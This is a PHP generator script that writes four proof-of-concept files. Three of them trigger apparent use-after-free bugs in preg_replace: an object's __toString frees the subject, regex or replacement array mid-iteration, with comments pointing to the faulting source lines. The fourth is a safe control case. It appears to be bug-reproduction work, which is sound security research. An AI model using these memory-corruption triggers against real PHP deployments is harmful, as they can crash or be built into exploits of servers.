<?php
$T = [];

// (1) subject ARRAY: object element __toString frees the referenced subject mid-scan
//     -> _preg_replace_common ext/pcre/php_pcre.c:2315 ZEND_HASH_FOREACH over freed subject_ht
$T['e5_01_preg_subject_array'] = <<<'P'
class E { function __toString(){ $GLOBALS['s'] = []; gc_collect_cycles(); return "aaa"; } }
$s = [ new E() ];
for($i=0;$i<3000;$i++) $s[] = "aaa$i";
$GLOBALS['s'] =& $s;                 // reference: reassignment frees the HT
$r = preg_replace('/a/', 'b', $s);   // frameless 3-arg
var_dump(is_array($r));
P;

// (2) regex ARRAY: object element __toString frees the referenced regex array
//     -> php_pcre_replace_array php_pcre.c:2129 ZEND_HASH_FOREACH_VAL over freed regex
$T['e5_02_preg_regex_array'] = <<<'P'
class E { function __toString(){ $GLOBALS['re'] = []; gc_collect_cycles(); return "/a/"; } }
$re = [ new E() ];
for($i=0;$i<3000;$i++) $re[] = '/a/';
$GLOBALS['re'] =& $re;
$r = preg_replace($re, 'b', 'aaaa');
var_dump(is_string($r));
P;

// (3) replace ARRAY: object element __toString frees the referenced replace array
//     -> php_pcre_replace_array php_pcre.c:2104 ZEND_HASH_ELEMENT(replace_ht, idx) after free
$T['e5_03_preg_replace_array'] = <<<'P'
class E { function __toString(){ $GLOBALS['rep'] = []; gc_collect_cycles(); return "b"; } }
$re = []; $rep = [];
for($i=0;$i<3000;$i++){ $re[]='/a/'; $rep[]="b$i"; }
$rep[1] = new E();                   // second replacement frees $rep
$GLOBALS['rep'] =& $rep;
$r = preg_replace($re, $rep, 'aaaa');
var_dump(is_string($r));
P;

// (4) framed control: call_user_func disables frameless -> SEND addref -> COW -> safe
$T['e5_04_preg_subject_framed'] = <<<'P'
class E { function __toString(){ $GLOBALS['s'] = []; gc_collect_cycles(); return "aaa"; } }
$s = [ new E() ];
for($i=0;$i<3000;$i++) $s[] = "aaa$i";
$GLOBALS['s'] =& $s;
$r = call_user_func('preg_replace', '/a/', 'b', $s);
var_dump(is_array($r));
P;

foreach ($T as $name=>$body) {
  file_put_contents(__DIR__."/$name.php", "<?php\n".$body."\necho \"OK\\n\";\n");
}
echo "wrote ".count($T)." files\n";
